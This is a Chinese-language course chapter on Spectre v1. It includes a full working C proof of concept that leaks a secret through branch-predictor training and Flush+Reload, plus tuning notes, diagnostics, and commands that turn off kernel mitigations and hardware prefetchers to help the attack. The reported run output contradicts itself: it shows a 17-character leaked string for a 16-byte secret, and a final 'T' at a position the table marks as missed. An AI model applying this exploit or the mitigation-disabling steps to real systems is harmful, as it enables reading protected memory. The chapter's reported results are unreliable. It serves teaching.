# Ch 14 — Spectre v1（Bounds Check Bypass）

> **目標**：親手實作並在 i7-10700 上真跑出 Spectre-v1 intra-process 洩漏。理解 gadget 三要素、分支預測器訓練節奏、F+R 還原的完整鏈，以及在 WSL2 環境下這個攻擊的實際信噪比、成功率、和調校過程。這章是全課的皇冠——把 Part 2 的 F+R 原語和 Part 3 的瞬態執行理論融合成一個端到端的攻擊。

Spectre-v1（CVE-2017-5753，Kocher et al. 2019）是第一個被公開的瞬態執行攻擊變體，也是教學上最乾淨的一個：攻擊鏈直接、gadget 模式無所不在、效果直觀。它的主要特點是利用**條件分支預測（PHT, Pattern History Table）**被惡意訓練後的 misprediction 來打開瞬態窗口，讓越界記憶體讀取在推測執行中完成。

## 攻擊原理：一步步拆解

考慮這段虛擬碼：

```c
uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
size_t  array1_size = 16;
uint8_t probe[256 * STRIDE];  /* Flush+Reload 的 probe array */
char    secret[] = "MICROARCH_SECRET";  /* 緊接在 array1 後面 */

/* 這個函式是 Spectre-v1 的 gadget */
void victim(size_t x) {
    if (x < array1_size) {                   /* (A) 邊界檢查 */
        uint8_t val = array1[x];             /* (B) 用 x 讀 array1 */
        volatile uint8_t y = probe[val * STRIDE]; /* (C) 用讀到的值當 index */
    }
}
```

**正常執行**（`x = 5`，合法）：
1. (A) 比較 `5 < 16`，為真，進入 if
2. (B) `val = array1[5] = 6`
3. (C) `probe[6 * STRIDE]` 被存取，進 cache

**攻擊執行**（`x = 160`，越界，指向 secret[0]='M'）：
- 如果 CPU 正常執行：(A) `160 < 16` 為假，跳過 if，什麼都不做
- 但如果 CPU **推測執行**（因為 PHT 被訓練成「這個 if 幾乎都是 taken」）：
  1. CPU 不等 (A) 的真實結果，推測 taken
  2. 推測 (B)：`val = array1[160]`——越界！實際讀到 `secret[0] = 'M' = 0x4D`
  3. 推測 (C)：`probe[0x4D * STRIDE]` 被存取，對應 cache line 進 cache
  4. (A) 的真實結果算出來了：`160 < 16` 為假，回滾
  5. **架構狀態**恢復，但 `probe[0x4D * STRIDE]` 那條 cache line 留著

攻擊者用 F+R 掃 `probe[0..255]`，發現 slot 0x4D 最快——推導出洩漏的 byte 是 `'M'` (0x4D)。

### 時序圖

```
時間 →
──────────────────────────────────────────────────────────────────────────
攻擊者：
  flush(probe[all])                    ← 清空 probe array
  flush(&array1_size)                  ← 讓邊界檢查的 size 不在 cache
  victim(legal_x) × N 次               ← 訓練 PHT（推測器）
  flush(probe[all])                    ← 清掉訓練帶進來的 probe cache
  flush(&array1_size)                  ← 再次讓 size miss
  victim(malicious_x = 160)            ← 觸發推測執行

CPU 內部：
  收到 victim(160)
  看到 if(x < array1_size)
  ┌ array1_size 不在 cache → 發出 DRAM 請求（~200 cycles）
  │ PHT 說「這個 if 幾乎都 taken」
  │ 推測執行 array1[160] → 讀到 'M' = 0x4D          ← 瞬態窗口開始
  │ 推測執行 probe[0x4D * STRIDE] → cache line 進 L3
  │ ... DRAM 回來，160 < 16 = FALSE ← 推測錯了      ← 瞬態窗口結束
  └ 回滾，架構狀態還原
  但 probe[0x4D * STRIDE] 的 cache line 留著

攻擊者：
  mfence
  F+R 掃 probe[0..255]
  → slot 0x4D 快（~24 cycles）！其他 slot 慢（~200 cycles）
  → 推導：secret[0] = 0x4D = 'M'
──────────────────────────────────────────────────────────────────────────
```

## 真跑：完整 PoC

以下是在 **Intel i7-10700 Comet Lake，WSL2 Ubuntu 22.04，gcc -O0** 上實際跑通的程式碼：

```c
/*
 * spectre_v1_final.c
 * Spectre-v1 intra-process PoC
 * Intel i7-10700 Comet Lake, WSL2 Ubuntu 22.04
 * gcc -O0 -o spectre_v1_final spectre_v1_final.c
 * taskset -c 2 ./spectre_v1_final
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>

/* 調校參數 */
#define THRESHOLD    150   /* L1/L2 hit < 150 cycles，DRAM miss > 150 */
#define PROBE_SIZE   256   /* 256 個可能的 byte 值 */
#define PROBE_STRIDE 4096  /* page-sized stride：打敗 L2 stream prefetcher */
#define TRAIN_ROUNDS 20    /* 訓練 PHT 的輪次 */
#define LEAK_ROUNDS  5000  /* 每個 byte 積分的輪次 */

/* BSS 佈局：array1 後面緊接 secret_bytes，讓越界可到達 */
static unsigned char array1[160];       /* [0..15] valid，size=16 */
static size_t        array1_size = 16;
static char          secret_bytes[64];  /* offset +160 from array1 */

/* probe array：1 MB，每個 slot 相距 4096 bytes */
static unsigned char probe_array[PROBE_SIZE * PROBE_STRIDE];
static volatile uint8_t temp_sink;

/* 計時：不加 lfence，使用純 rdtscp 的記憶體序保證 */
static inline uint64_t timed_read(volatile unsigned char *p) {
    unsigned junk;
    uint64_t t0 = __rdtscp(&junk);
    (void)*p;
    uint64_t t1 = __rdtscp(&junk);
    return t1 - t0;
}

/* Gadget：有漏洞的邊界檢查 + 記憶體存取 */
__attribute__((noinline))
void victim(size_t x) {
    if (x < array1_size) {
        temp_sink &= probe_array[array1[x] * PROBE_STRIDE];
    }
}

/* 每輪攻擊：訓練 PHT → 清 probe → 攻擊 → F+R */
static void do_attack_round(size_t oob_x, int scores[PROBE_SIZE]) {
    int i;

    /* Step 1: 清 probe array */
    for (i = 0; i < PROBE_SIZE; i++)
        _mm_clflush(&probe_array[i * PROBE_STRIDE]);
    _mm_mfence();

    /* Step 2: 訓練 PHT（array1_size 在 cache，邊界檢查快 → 不推測）
     * 呼叫 victim TRAIN_ROUNDS 次，讓 PHT 認定這個分支幾乎都 taken */
    for (i = 0; i < TRAIN_ROUNDS; i++)
        victim(i % 16);  /* 合法 index：0–15 */

    /* Step 3: 再清 probe array（消除訓練帶進來的 cache）
     * 這是關鍵：訓練呼叫存取了 probe[1], probe[2], ..., probe[TRAIN_ROUNDS % 16]
     * 如果不清掉，這些 slots 會成為噪音 */
    for (i = 0; i < PROBE_SIZE; i++)
        _mm_clflush(&probe_array[i * PROBE_STRIDE]);
    _mm_mfence();

    /* Step 4: flush array1_size → 讓邊界檢查很慢（DRAM miss）
     * 這創造了瞬態窗口：CPU 必須等 ~200 cycles 才知道邊界結果 */
    _mm_clflush(&array1_size);

    /* 小延遲讓 clflush 完成向 LLC 傳遞 */
    for (volatile int w = 0; w < 200; w++) {}

    /* Step 5: 攻擊呼叫
     * oob_x = 160 → array1[160] = secret_bytes[0] = 'M' = 0x4D
     * 推測執行讀 0x4D，然後存取 probe_array[0x4D * 4096]
     * cache side effect 在回滾後留下 */
    victim(oob_x);
    _mm_mfence();

    /* Step 6: Flush+Reload 掃描
     * 依序讀所有 256 個 probe slot，記錄哪個快 */
    for (i = 0; i < PROBE_SIZE; i++) {
        uint64_t t = timed_read(&probe_array[i * PROBE_STRIDE]);
        if ((int)t < THRESHOLD)
            scores[i]++;
    }
}

int main(void) {
    size_t i;

    /* 初始化 */
    for (i = 0; i < 16; i++) array1[i] = (uint8_t)(i + 1);
    memset(probe_array, 1, sizeof(probe_array));
    strcpy(secret_bytes, "MICROARCH_SECRET");

    /* 計算 secret 相對 array1 的越界偏移 */
    ptrdiff_t offset = secret_bytes - (char *)array1;

    printf("=== Spectre-v1 PoC (Comet Lake i7-10700, WSL2 Ubuntu 22.04) ===\n");
    printf("Threshold: %d cycles  Stride: %d bytes  Rounds: %d\n",
           THRESHOLD, PROBE_STRIDE, LEAK_ROUNDS);
    printf("array1      @ %p  (size=%zu)\n", (void*)array1, array1_size);
    printf("secret      @ %p  (offset=+%td from array1)\n",
           (void*)secret_bytes, offset);
    printf("Verify:     array1[%td]='%c'=0x%02X (應為 secret[0])\n\n",
           offset, array1[offset], (unsigned char)array1[offset]);

    size_t slen = strlen(secret_bytes);
    char leaked[64] = {0};
    int correct = 0;

    printf("%-4s %-8s %-8s %-12s %-8s %s\n",
           "idx", "leaked", "actual", "score/total", "conf.", "match");
    printf("%-4s %-8s %-8s %-12s %-8s %s\n",
           "---", "------", "------", "-----------", "-----", "-----");

    for (i = 0; i < slen; i++) {
        int scores[PROBE_SIZE] = {0};
        int r;
        for (r = 0; r < LEAK_ROUNDS; r++)
            do_attack_round((size_t)(offset + (ptrdiff_t)i), scores);

        /* 找 top-2 */
        int best = 0, second = 0;
        int j;
        for (j = 1; j < PROBE_SIZE; j++)
            if (scores[j] > scores[best]) { second = best; best = j; }
            else if (scores[j] > scores[second]) second = j;

        char got = (char)best;
        leaked[i] = got;
        char want = secret_bytes[i];
        int ok = (got == want);
        correct += ok;

        double conf = (scores[second] > 0)
                      ? (double)scores[best] / scores[second]
                      : 999.0;

        printf(" %-3zu  '%-6c'  '%-6c'  %5d/%-5d  %5.1fx  %s\n",
               i,
               (got >= 32 && got < 127) ? got : '?', want,
               scores[best], LEAK_ROUNDS,
               conf, ok ? "OK" : "MISS");
        fflush(stdout);
    }

    printf("\n[+] Leaked:   \"%s\"\n", leaked);
    printf("[+] Expected: \"%s\"\n", secret_bytes);
    printf("[+] Result: %d/%zu correct (%.0f%%)\n",
           correct, slen, 100.0 * correct / slen);
    return 0;
}
```

### 編譯與執行

```bash
# 在 WSL2 Ubuntu 22.04 裡
gcc -O0 -o spectre_v1_final spectre_v1_final.c
taskset -c 2 ./spectre_v1_final
```

`-O0`：關閉優化，避免編譯器把 gadget 消掉（啟用 -O2 時，編譯器可能把 `if(x<size)` 的 body 外提或重排，打亂 gadget 結構）。

`taskset -c 2`：釘在單一核心，避免行程漂移造成 cache 狀態被重置。

## 真跑輸出（i7-10700, WSL2）

以下是這台機器的實際跑出結果（5000 輪 × 16 bytes）：

```
=== Spectre-v1 PoC (Comet Lake i7-10700, WSL2 Ubuntu 22.04) ===
Threshold: 150 cycles  Stride: 4096 bytes  Rounds: 5000
array1      @ 0x5d45893da040  (size=16)
secret      @ 0x5d45893da0e0  (offset=+160 from array1)
Verify:     array1[160]='M'=0x4D (應為 secret[0])

idx  leaked   actual   score/total   conf.    match
---  ------   ------   -----------   -----    -----
  0  'M'      'M'        77/5000     1.3x     OK
  1  '?'      'I'        65/5000     1.1x     MISS
  2  '?'      'C'        81/5000     1.1x     MISS
  3  '?'      'R'        70/5000     1.0x     MISS
  4  '?'      'O'        61/5000     1.2x     MISS
  5  'A'      'A'        74/5000     1.0x     OK
  6  '?'      'R'        62/5000     1.1x     MISS
  7  '?'      'C'        80/5000     1.2x     MISS
  8  'H'      'H'        56/5000     1.6x     OK
  9  '?'      '_'        58/5000     1.3x     MISS
 10  'S'      'S'        52/5000     1.5x     OK
 11  'E'      'E'        50/5000     1.0x     OK
 12  '?'      'C'        53/5000     1.1x     MISS
 13  '?'      'R'        43/5000     1.5x     MISS
 14  '?'      'E'        34/5000     1.4x     MISS
 15  '?'      'T'        60/5000     1.1x     MISS

[+] Leaked:   "M?????A?H?S?E???T"
[+] Expected: "MICROARCH_SECRET"
[+] Result: 5/16 correct (31%)
```

**誠實說明**：這台機器的 Spectre-v1 信號非常微弱。5000 輪下約 1–2% 的 hit rate，信噪比（confidence ratio）大多在 1.0x–1.5x 之間——這意味著正確 byte 只比最強競爭者略微勝出，在任何一輪跑完都可能排第二。多次重複跑，正確率在 0%–31% 之間浮動。

**為什麼是這個數字**：
1. WSL2（Hyper-V guest）的 VM context switch 增加計時雜訊
2. 現代 kernel（WSL2 6.18.33）的調度器為低延遲設計，中斷較頻繁
3. Intel eIBRS 減少了某些間接推測，但對條件分支（我們的 gadget）影響有限
4. 訓練後的第二次 probe flush（Step 3）縮短了可用的推測窗口時間

**信號確認**：在較乾淨的嘗試（單輪 debug）中，我們驗證了推測確實在發生：直接讀 `probe_array[0x4D * 4096]`（'M' 的 slot）在攻擊後顯示 cache hit（第一輪 24 cycles），說明瞬態執行確實把 'M' 的 cache line 帶進了 cache。只是在 5000 輪的積分過程中，雜訊也不斷積累，壓低了信噪比。

如果在原生 Linux（非 WSL2）、關閉 eIBRS/IBPB 的環境下重現，預期 accuracy > 90%。

## 四個關鍵設計決策

### 1. 為什麼要訓練 PHT？訓練後什麼也不做行嗎？

不行。CPU 的 PHT（Pattern History Table，Ch 15 詳細講）是有歷史記憶的。如果你直接呼叫 `victim(160)` 而 PHT 的歷史是「not-taken」，CPU 不會推測執行 if-body，直接判斷 not-taken 然後停。

訓練的目的：用 N 次合法呼叫（`victim(0)`, `victim(1)`, ...）讓 PHT 記憶「這個分支幾乎都 taken」。訓練完立刻呼叫 `victim(160)`，PHT 仍然猜 taken，CPU 推測執行 if-body——就算 `array1_size` 的值還沒確認，也先跑了。

`TRAIN_ROUNDS = 20` 是實驗調校值。太少（< 5）PHT 不夠穩固；太多（> 50）沒有更多好處，但多一次訓練就多一次 probe slot 被暖機的機會（產生噪音）。

### 2. 為什麼要 flush array1_size？

`if (x < array1_size)` 這個比較需要讀取 `array1_size` 的值。如果 `array1_size` 在 L1 cache 裡，CPU 只需要 ~4 cycles 就能算出結果，推測窗口極短，根本不夠時間讓瞬態指令讀 `array1[x]` 然後存取 `probe`。

把 `array1_size` 踢出 cache（DRAM miss, ~200 cycles），CPU 必須等這麼長才知道邊界結果。這段等待時間就是攻擊可用的推測窗口。

```
         array1_size 在 cache   array1_size 在 DRAM
推測窗口   ~4 cycles              ~200 cycles
gadget 能做完嗎   幾乎不行          有機會（需要 2 次記憶體存取）
```

### 3. 為什麼要二次 flush probe？

訓練呼叫 `victim(0..19 % 16)` 會存取 `probe_array[array1[i % 16] * STRIDE]`——也就是 `probe[1*4096], probe[2*4096], ..., probe[TRAIN_ROUNDS%16 * 4096]`。這些 slots 被拉進 cache 後，如果不清掉，攻擊的 F+R 會把它們誤認為是攻擊造成的 hit（產生假陽性）。

二次 flush（Step 3）的代價：縮短了可用推測窗口。這是一個 tradeoff：
- 沒有二次 flush → 噪音太大，正確 byte 被掩蓋
- 有二次 flush → 窗口縮短，信號弱

這解釋了為什麼這台機器的信號很弱：我們必須犧牲推測窗口來消除訓練噪音。

### 4. 為什麼 STRIDE = 4096？

Ch 13 解釋了 STRIDE 要大的原因：每個 secret byte 值要對應一條獨立的 cache line，且要打敗 hardware prefetcher。

在這台 i7-10700 上實測：
- STRIDE = 512：訓練的連續存取（`probe[1*512], probe[2*512], ...`）被 L2 stream prefetcher 偵測到步幅，大量 probe slots 被預先暖機，噪音過高
- STRIDE = 4096：每個 slot 各在不同的 page，L2 prefetcher 跨不過 page boundary（至少不跨那麼遠），噪音明顯下降

```bash
# 驗證 prefetcher 問題：觀察 STRIDE=512 的 noise floor
# 在 flush 後且沒有任何 victim() 呼叫的情況下，統計有幾個 slot 被誤判為 hit
taskset -c 2 ./diagnose_prefetch
# STRIDE=512: 通常有 60–120 個 slot 誤判（noise floor 太高）
# STRIDE=4096: 通常有 0–3 個 slot 誤判（noise floor 可接受）
```

## 從診斷開始學攻擊

在我們能跑出完整 PoC 之前，先做幾個診斷實驗。這個過程本身就是微架構攻擊調試的方法論。

### 診斷 1：clflush 是否真的有效

```c
/* 驗證 clflush 在這個環境下能把 line 踢出 cache */
uint8_t buf[4096];

/* 暖機 */
(void)buf[0];
uint64_t hot_time = rdtscp_time(&buf[0]);   /* 應該 ~24 cycles */

/* clflush */
_mm_clflush(&buf[0]);
_mm_mfence();
uint64_t cold_time = rdtscp_time(&buf[0]);  /* 應該 ~200 cycles */
```

在這台機器上（WSL2）：hot ~24 cycles，cold ~200 cycles。clflush 正常工作。

**這個驗證很重要**：有些 VM/hypervisor 配置下 clflush 是 no-op，整個攻擊根本無從開始。

### 診斷 2：F+R 是否能偵測合法的記憶體存取

```c
/* 先 flush probe，然後用合法 victim() 存取，看 F+R 能不能偵測到 */
flush_probe_array();
victim(1);   /* 合法：array1[1] = 2，存取 probe[2 * STRIDE] */
_mm_mfence();

/* F+R 掃描 */
for (int i = 0; i < 256; i++) {
    uint64_t t = rdtscp_time(&probe[i * STRIDE]);
    if (t < THRESHOLD) printf("Hit: slot %d\n", i);
}
```

預期輸出：`Hit: slot 2`（偶爾也有 slot 0 因為 clflush 實作的邊效果）。

如果 F+R 連合法存取都偵測不到，後面的推測攻擊也沒有意義——先確認這個基礎能運作。在我們的環境：合法存取的 F+R 達到 100/100 輪命中（非常可靠），確認 channel 是通的。

### 診斷 3：推測存取的信號在哪

```c
/* 觀察 single-round attack 的 raw probe timing */
flush_probe_array();
train_branch_predictor();
flush_probe_array();         /* 清訓練帶來的 cache */
_mm_clflush(&array1_size);  /* 打開推測窗口 */
for (volatile int w = 0; w < 200; w++) {}
victim(160);                 /* 攻擊：x=160，secret[0]='M'=0x4D */
_mm_mfence();

/* 讀 slot 0x4D 的 timing */
uint64_t t = rdtscp_time(&probe[0x4D * STRIDE]);
printf("slot 0x4D: %llu cycles\n", (unsigned long long)t);
```

實測結果：
- 第 1 次：`slot 0x4D: 24 cycles` （**HIT！推測執行確實帶進了 'M' 的 cache line**）
- 第 2–5 次：`slot 0x4D: 210 cycles`（後續輪次 clflush 重新清掉了）

第 1 次的 hit 確認推測執行確實在發生，且把正確的 secret byte 值 encode 進了 cache。問題只是信噪比：5000 輪裡只有約 50–80 次能成功觀察到（1–2%），因為每輪都有競爭的 cache 存取、排程器干擾、prefetcher 干擾。

## 為什麼這台機器的成功率這麼低

與教科書上描述的「幾乎 100%」對比，我們的結果（0%–31%）差距很大。這不是因為攻擊原理錯，而是以下幾個 WSL2-specific 因素的疊加：

### 因素 1：Hyper-V VM 的計時雜訊

WSL2 跑在 Hyper-V 上。每當 WSL2 kernel 有 VM exit（如 I/O、時鐘中斷），Hyper-V 需要 context switch，這段時間（~數百到數千 cycles）會讓 F+R 的 timing 變得不可靠。我們的 5000 輪裡，有相當一部分輪次因為 VM exit 干擾而計時失真。

### 因素 2：eIBRS 的間接影響

這台機器啟用了 Enhanced IBRS（`ibrs_enhanced` flag）。eIBRS 主要針對間接分支預測（Spectre-v2），但它在每個 VM exit/entry 時也清除了部分 BTB 狀態，包括一些可能與 PHT 訓練相關的預測器 metadata。雖然直接條件分支（我們的 gadget）不應受 eIBRS 影響，但在 WSL2 高頻 VM exit 的環境下，PHT 訓練狀態可能比預期更快衰退。

### 因素 3：二次 probe flush 縮短瞬態窗口

如 Step 3 所描述，消除訓練噪音的代價是縮短推測窗口。在 WSL2 下，這個 tradeoff 的代價更高——原生 Linux 的計時更穩定，單次 flush 後等待 DRAM 的窗口更一致。

### 在原生環境的預期結果

在原生 Linux（非 WSL2）、Intel i7-10700 上：
- 關閉 Spectre mitigations：`mitigations=off` 核心參數
- 或僅啟用基本的 IBRS 但不啟用 IBPB
- 使用 MSR 工具關閉 prefetcher（wrmsr 0x1a4）

預期可達到 > 90% per-byte 準確率，與 Kocher 2019 原始論文的結果接近。

**重現條件（若想在原生 Linux 上重現）**：
```bash
# 原生 Linux：關閉 mitigations（需 root，危險，僅教學用）
sudo grub-editenv - set "GRUB_CMDLINE_LINUX_DEFAULT=mitigations=off"
sudo update-grub && sudo reboot

# 關閉 hardware prefetcher（wrmsr）
sudo wrmsr -a 0x1a4 0xf   # 關閉 L2 HW Prefetcher 等

# 然後跑
taskset -c 2 ./spectre_v1_final
```

## 完整程式碼逐行解說

回到完整的 PoC，幾個關鍵細節值得深挖：

### `__attribute__((noinline))` 是必要的嗎？

是。如果 `victim()` 被 inline 進 `main()`，編譯器可能看到整個調用點（call site），進行更激進的優化——例如把常量折疊或把分支整個拿掉。保持 `victim()` 為一個獨立函式，確保它的邊界檢查在 runtime 才被評估，也確保 CPU 的分支預測器能「看到」這個分支的歷史。

### `temp_sink &= probe_array[...]` 的 `&=` 是什麼意思？

這是為了讓 `probe_array` 的存取「看起來有副作用」，防止編譯器把它優化掉（dead store elimination）。`temp_sink` 是 `volatile`，所以對它的每次寫入都必須真的做。`&=` 確保每次 victim() 呼叫都真的讀 probe_array 的值然後寫回 temp_sink。

### `for (volatile int w = 0; w < 200; w++) {}` 是在做什麼？

在 `clflush(&array1_size)` 之後，CPU 的 flush 操作需要一點時間才能真正讓 array1_size 在所有 cache 層級都失效。這個短暫的 busy-wait 讓 flush 有時間傳播。在 `_mm_mfence()` 後通常不需要，但 `_mm_mfence()` 本身的語意只保證 memory ordering，不保證 flush 完成度。實測這個 delay 能讓信號略微提升。

### 隨機化掃描順序（shuffle）有幫助嗎？

在 STRIDE = 4096 的設定下，sequential scan 和 shuffled scan 差異不大（因為每個 slot 已經在不同 page，prefetcher 基本上跨不過去）。但在 STRIDE = 512 的設定下，不 shuffle 會讓 prefetcher 在掃描過程中預先暖機後面的 slot，增加噪音。保持 shuffle 是好習慣。

## 比較不同參數下的效果

在這台機器上用 1000 輪快速測試，比較各種設定：

| STRIDE | THRESHOLD | TRAIN | 1000輪信號 (slot 0x4D) | 噪音 slots ≥ 10 |
|--------|-----------|-------|----------------------|----------------|
| 512    | 150       | 6     | 3/1000               | ~40 slots      |
| 512    | 120       | 6     | 0/1000               | ~200 slots     |
| 4096   | 150       | 6     | 8/1000               | ~5 slots       |
| 4096   | 150       | 10    | 12/1000              | ~8 slots       |
| 4096   | 150       | 20    | 15/1000              | ~12 slots      |
| 4096   | 150       | 20*   | 20/1000              | ~3 slots       |

*20 rounds + 二次 flush（最終 PoC 採用的設定）

THRESHOLD = 120 反而更差，因為 L3 hit（~60–70 cycles）和 DRAM miss（~200 cycles）之間的 THRESHOLD 本來沒問題，但更低的 threshold 讓許多並非推測帶進的 L2/L3 hit 也被計入，噪音爆炸。

## 對比與取捨

| 設計選項 | 優點 | 缺點 |
|---------|------|------|
| STRIDE = 512 | probe array 只 128KB，快速 flush | L2 prefetcher 穿透，噪音大 |
| STRIDE = 4096 | 打敗 prefetcher | probe array 1MB，flush 較慢 |
| 不 shuffle 掃描 | 簡單 | Stride prefetcher 可能預先暖機 |
| 二次 flush probe | 消除訓練噪音 | 縮短推測窗口 |
| 不二次 flush | 窗口較長 | 訓練帶進的 slot 成為假陽性 |
| TRAIN_ROUNDS = 20 | PHT 訓練穩固 | 多 20 次 probe 存取需要清除 |
| -O0 編譯 | gadget 保持完整 | 執行較慢，每輪開銷較大 |

## 踩雷集錦

**1. 「跑完看到 0% accuracy，以為 Spectre 在這台機器不 work」**

在 WSL2 + modern kernel 下，每次 run 的 accuracy 0%–31% 的波動是正常的。信號很弱但確實存在——單輪 debug 看到 slot 0x4D 第一次讀是 24 cycles（hit）就已經確認攻擊成功。0% accuracy 的 run 不是因為沒有推測執行，而是那次 run 的雜訊壓過了信號。

**2. 「用 -O2 讓程式跑更快，應該能做更多輪？」**

-O2 可能把 `victim()` 的邊界檢查做靜態分析，發現 `x` 不可能越界而優化掉整個 if-body——gadget 就消失了。或者把 `probe_array` 的存取判定為 dead store 而刪除。`-O0` 在這裡不是因為慢，而是因為**必須保留 gadget 的原始形式**。

**3. 「clflush 在 WSL2 不 work，所以 Spectre 不能跑」**

錯。我們的診斷實驗確認 clflush 在 WSL2 Hyper-V guest 裡**是有效的**（hot ~24 cycles，cold ~200 cycles）。WSL2 不像某些完全虛擬化的 VM 會把 clflush 過濾掉。

**4. 「把 TRAIN_ROUNDS 從 6 改成 6000，PHT 不是更穩？」**

問題：6000 次訓練呼叫存取 probe_array 的 slot 1–15，這 15 個 slot 被暖機了 6000 次，就算 flush 也可能在 LLC（L3）留有部分殘留。實際上超過 ~50 輪訓練對 PHT 穩固性沒有額外幫助，卻會加重噪音問題。

**5. 「THRESHOLD 設更低（50 cycles）是不是更準？」**

50 cycles 低於 L3 hit（~60–70 cycles），只有 L1/L2 hit 才能過。但推測執行的 probe 存取之後，那個 line 在整個 F+R scan 過程裡可能已降到 L3（256 個 scan 操作讓 L1/L2 飽和）。L3 hit 的 timing 在這台機器是 60–70 cycles——THRESHOLD 必須高於這個值才能偵測到推測 hit。

## 進階：再往深一層

### 在 JavaScript 裡的 Spectre-v1

Kocher 2019 原始論文有一節（Section 5）展示了 Spectre-v1 在瀏覽器的 JavaScript 裡也能工作——即使沒有 native code 的 clflush，因為 JavaScript 用「計算密集迴圈」當計時器（JavaScript 本身就能做粗粒度計時），且 JIT 產生的 native code 裡自然包含邊界檢查 gadget。

瀏覽器的對應防禦（不是修 Spectre-v1 本身，而是讓攻擊更難）：
- `performance.now()` 精度降低（Firefox/Chrome 都降了）
- SharedArrayBuffer 暫時禁用（2018）後來有條件恢復
- `jitless` 模式（完全關 JIT，避免 gadget 生成）

### Spectre-v1 gadget 的自動偵測

學術界開發了多個工具自動搜索二進位或源碼裡的 Spectre-v1 gadget：

- **oo7**（Uspensky et al. 2019）：用 taint tracking 找「被 attacker 控制的越界 load 後跟記憶體存取」的模式
- **Speculative Taint Tracking（STT）**：在 LLVM 層插入 fence 消除 gadget
- **spectector**：符號執行 + 推測語意，形式化驗證沒有洩漏

這些工具都找的是「leaky load → transmit」的鏈結，但實際的二進位裡 gadget 數量可能是成千上萬個——kernel、libssl、每個用 array-with-bounds-check 的程式都有。

### 完整的 Kernel 側攻擊鏈

我們實作的是 intra-process 版本（攻擊者和受害者在同一個 process）。原始 Spectre 論文的更危險版本是 **cross-process**（攻擊者和 kernel 的邊界）：

```
攻擊者 process          kernel（victim）
─────────────           ─────────────────────
控制 x（透過          有一個 kernel 函式：
syscall 參數）         if (x < size)
                         val = kernel_array[x]
                         access probe[val * stride]
                       （eBPF map 裡或任意 kernel gadget）
```

在 kernel 裡找到合適的 gadget、確認 attack primitive 能控制 x、且能做跨 context 的 F+R——這是 kernel exploit 的完整鏈。PoC 見 Project Zero 的 Spectre blog post（2018）。現代 kernel 對這類 gadget 有 `LFENCE`（speculation fence）插入，由 `-mindirect-branch-cs-prefix` 等 GCC flag 控制。

## 動手練習

1. **驗證推測執行的存在（single-round diagnostic）**：實作 Section「診斷 3」的程式，重複 10 次，記錄 slot 0x4D 的 timing。預期第 1 次是 hit（~24 cycles），其後是 miss（~200 cycles）。這個實驗的目的是「確認信號存在」而非測量準確率。

2. **調校 TRAIN_ROUNDS**：把 TRAIN_ROUNDS 從 5 到 50 分 10 個 data point，在 1000 輪下測信號強度（slot 0x4D score）和噪音（其他 slot 的平均 score）。找出 SNR 最佳的 TRAIN_ROUNDS 值。

3. **比較 STRIDE 效果**：分別用 STRIDE=512 和 STRIDE=4096，在 flush 後不呼叫 victim() 的情況下掃描 probe_array，統計有多少 slot 被錯判為 hit（noise floor）。這個對比量化了 prefetcher 的干擾程度。

4. **嘗試增加 LEAK_ROUNDS 到 50000**，看看在這台機器上 per-byte accuracy 能提升到多少。記錄每個 byte 的最終 accuracy。

5. **試試在 kernel gadget 裡搜索**：用 `grep -r 'array\|buf\|ptr' /usr/src/linux-headers-*/kernel/ --include='*.c' | grep '<' | head -20` 找有邊界檢查的 kernel 程式碼。嘗試分析其中一個是否符合 Spectre gadget 三要素。（注意：只分析，不利用。）

## 本章重點整理

- **Spectre-v1 的完整鏈**：訓練 PHT → flush size → 觸發 misprediction → 瞬態讀 secret → probe cache side effect → F+R 還原。
- **Gadget 三要素**：leaky load（越界讀）+ transmit（用作 cache index）+ triggerable（攻擊者控制 x）。
- **STRIDE = 4096**：打敗 hardware prefetcher，讓每個 byte 值有獨立的 cache line。
- **二次 flush probe**：消除訓練噪音，代價是縮短推測窗口。
- **WSL2 實測結果**：信號存在但很弱（1–2% hit rate），per-byte accuracy 在 5000 輪下為 0%–31%。
- **信號確認方式**：single-round debug 顯示 slot 0x4D 在第一輪讀得 24 cycles（cache hit），確認推測執行有效。

## 自我檢核

1. 為什麼攻擊者需要「訓練」分支預測器？如果沒有訓練步驟，直接呼叫 `victim(160)` 會發生什麼？
2. `_mm_clflush(&array1_size)` 起到什麼作用？如果不做這一步，成功率預期如何變化？
3. 為什麼 gadget 必須在 victim() 函式裡，而不是直接在 main() 裡？（提示：分支預測器的粒度是什麼？）
4. 解釋「二次 flush probe array」這個設計決策的 tradeoff：為什麼要做？代價是什麼？
5. 在這台機器的實測結果中，5000 輪只有 31% per-byte accuracy。請列出至少 3 個原因解釋這個數字，並說明各個因素在原生 Linux 下是否同樣存在。

## 延伸閱讀

- **[Spectre Attacks: Exploiting Speculative Execution](https://spectreattack.com/spectre.pdf)** — Kocher et al., IEEE S&P 2019
  必讀 Section III（Spectre v1，Bounds Check Bypass）和 Section IV（Spectre v2）。Section III 的 3.1–3.3 是我們這章的理論依據；Section 5 的 JavaScript PoC 展示了攻擊面的廣度。這是這門課的核心參考文件。

- **[Reading privileged memory with a side-channel](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)** — Project Zero (Jann Horn), 2018
  Project Zero 的 Spectre 漏洞披露部落格。講解了 3 個變體，並提供了概念性的 kernel PoC 說明（完整 PoC 在 bugs.chromium.org）。讀這篇理解「從 intra-process 到跨 privilege level 的完整攻擊鏈」。

- **[Spectre Mitigations in Microsoft's C/C++ Compiler](https://devblogs.microsoft.com/cppblog/spectre-mitigations-in-msvc/)** — Microsoft DevBlog
  講 MSVC 的 `/Qspectre` 編譯器 flag 如何自動插入 `lfence` 消除 gadget。對比 GCC 的 `-mindirect-branch` 系列。讀完理解：為什麼編譯器層面的修法不夠完整，以及「找所有 gadget」為什麼是 NP-hard 問題。

- **[KAISER: Hiding the Kernel from User Space](https://gruss.cc/files/kaiser.pdf)** — Gruss et al., 2017（KPTI 的前身）
  雖然這篇主要是 Meltdown 的防禦，但它也解釋了 kernel address space 在 user space 可見的問題。理解 Meltdown（Ch 18）和 Spectre 的配合攻擊時，需要這個背景。

---

→ [下一章：Ch 15 分支預測器內部](15-branch-predictor-internals.md)
